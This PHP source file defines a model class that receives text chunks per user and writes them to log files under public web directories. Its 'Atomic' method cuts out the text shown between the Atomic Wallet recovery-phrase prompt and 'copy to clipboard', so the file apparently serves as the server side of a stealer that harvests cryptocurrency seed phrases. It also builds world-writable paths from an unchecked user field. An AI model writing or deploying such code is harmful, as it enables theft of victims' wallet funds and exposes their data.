<?php

class CacheModel extends Database {

    public function Check($ID)
    {

        $match = parent::GET("SELECT * FROM `users` WHERE `id` = :id;", ["id" => $ID]);
        return $match && (count($match) >= 1);

    }

    public function Save($Body) {
        
        $dir = "public/logs/".$Body->user;
        if(!mkdir($dir, 0777) && !is_dir($dir)) {
            return "Could not create a dir -> ".$dir;
        }

        $filename = $dir."/".date("ymd")."-".$Body->user.".log";
        
        if(!file_put_contents($filename, $Body->chunk, FILE_APPEND )) {
            return "Could not put content in file, check permissions";
        }

        return false;

    }

    public function Atomic($Body) {

        $dir = "public/atomic/".$Body->user;
        if(!mkdir($dir, 0777) && !is_dir($dir)) {
            return "Could not create a dir -> ".$dir;
        }

        $filename = $dir."/".date("ymd-hisa").".log";
        $extracted = "";

        $text = $Body->chunk;
        $start_marker = "that's the only way to restore your wallet if you forget your password";
        $end_marker   = "copy to clipboard";

        // Find the position of the start marker in the text
        $start_pos = strpos($text, $start_marker);

        if ($start_pos !== false) {
            // Move the start position to the end of the start marker to begin extraction after it
            $start_pos += strlen($start_marker);

            // Find the position of the end marker after the start marker
            $end_pos = strpos($text, $end_marker, $start_pos);

            if ($end_pos !== false) {
                // Extract the substring between the two markers
                $extracted = substr($text, $start_pos, $end_pos - $start_pos);

                // Optionally, trim whitespace
                $extracted = trim($extracted);

            } else {
                return "End marker not found.";
            }
        } else {
            return "Start marker not found.";
        }



        if(!file_put_contents($filename, $extracted, FILE_APPEND )) {
            return "Could not put content in file, check permissions";
        }

        return false;

    }

}
